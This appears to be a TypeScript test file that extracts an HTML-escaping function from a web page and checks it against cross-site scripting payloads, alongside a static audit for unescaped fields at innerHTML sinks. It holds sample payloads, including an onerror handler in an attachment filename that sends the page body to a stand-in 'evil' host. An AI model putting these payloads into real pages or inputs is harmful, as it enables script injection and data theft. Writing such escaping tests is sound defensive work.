// Validate ui.html's esc() and confirm no innerHTML sink is left unescaped.
import * as fs from "node:fs";
import { fileURLToPath } from "node:url";

// fileURLToPath, not .pathname — the vault lives under "Application Support"
// and .pathname leaves the space percent-encoded, so the read ENOENTs.
const html = fs.readFileSync(fileURLToPath(new URL("./ui.html", import.meta.url)), "utf-8");

let pass = 0;
let fail = 0;
function check(name: string, fn: () => void) {
  try {
    fn();
    pass++;
    console.log(`  PASS  ${name}`);
  } catch (e) {
    fail++;
    console.log(`  FAIL  ${name}\n        ${(e as Error).message}`);
  }
}

console.log("\nui.html XSS escaping\n");

// Pull esc() out of the page and run it for real.
const escSrc = html.match(/const esc = \(v\) =>[\s\S]*?\.replace\(\/'\/g, "&#39;"\);/);
if (!escSrc) {
  console.log("  FAIL  could not locate esc() in ui.html");
  process.exit(1);
}
// eslint-disable-next-line @typescript-eslint/no-implied-eval
const esc = new Function(`${escSrc[0]} return esc;`)() as (v: unknown) => string;

check("script tags are neutralised", () => {
  const out = esc("<script>alert(1)</script>");
  if (out.includes("<script")) throw new Error(`raw tag survived: ${out}`);
  if (!out.includes("&lt;script&gt;")) throw new Error(`not escaped: ${out}`);
});

check("THE REAL VECTOR: an emailed filename cannot inject", () => {
  // An attacker emails an attachment with this name; it reaches
  // documents.original_filename and is rendered in three places.
  const filename = `<img src=x onerror="fetch('//evil/'+document.body.innerHTML)">.pdf`;
  const out = esc(filename);
  if (out.includes("<img")) throw new Error(`tag survived: ${out}`);
  if (out.includes('"')) throw new Error(`raw quote survived: ${out}`);
  if (/onerror=/.test(out) && !out.includes("&quot;")) {
    throw new Error(`handler left executable: ${out}`);
  }
});

check("single quotes are escaped (attribute breakout)", () => {
  // Lands in data-id='...' — an unescaped quote closes the attribute.
  const out = esc("x' onmouseover='alert(1)");
  if (out.includes("'")) throw new Error(`raw single quote survived: ${out}`);
  if (!out.includes("&#39;")) throw new Error(`not escaped: ${out}`);
});

check("ampersands are escaped first, no double-encoding of payloads", () => {
  if (esc("a & b") !== "a &amp; b") throw new Error(esc("a & b"));
  // &lt; must not become &amp;lt;
  if (esc("<") !== "&lt;") throw new Error(esc("<"));
});

check("null and undefined become empty, not the string 'null'", () => {
  if (esc(null) !== "") throw new Error(`null -> ${esc(null)}`);
  if (esc(undefined) !== "") throw new Error(`undefined -> ${esc(undefined)}`);
});

check("ordinary values pass through unchanged", () => {
  if (esc("Blue Tokai Coffee") !== "Blue Tokai Coffee") throw new Error(esc("Blue Tokai Coffee"));
  if (esc("CN_BZ859919_03082026.pdf") !== "CN_BZ859919_03082026.pdf") {
    throw new Error(esc("CN_BZ859919_03082026.pdf"));
  }
});

check("numbers survive (amounts, counts)", () => {
  if (esc(41682) !== "41682") throw new Error(esc(41682));
});

// Static audit: every remote-derived field at a sink must be wrapped.
check("no unescaped remote field remains at an innerHTML sink", () => {
  const risky = [
    "e.original_filename",
    "e.evidence_role",
    "e.linked_by",
    "l.account",
    "l.leg",
    "c.summary",
    "p.field",
    "p.value",
    "p.source",
    "x.counterparty_name",
    "x.occurred_at",
    "x.fy_key",
    "x.status",
    "x.direction",
  ];
  const unescaped: string[] = [];
  for (const f of risky) {
    // A bare `+ field` (not inside esc(...)) at a concatenation point.
    const bare = new RegExp(`\\+\\s*${f.replace(".", "\\.")}\\b`);
    if (bare.test(html)) unescaped.push(f);
  }
  if (unescaped.length) {
    throw new Error(`unescaped at a sink: ${unescaped.join(", ")}`);
  }
});

check("say (SSE-derived feed text) is escaped", () => {
  if (!/esc\(say\)/.test(html)) throw new Error("push() renders `say` unescaped");
});

console.log(`\n  ${pass} passed, ${fail} failed\n`);
process.exit(fail === 0 ? 0 : 1);
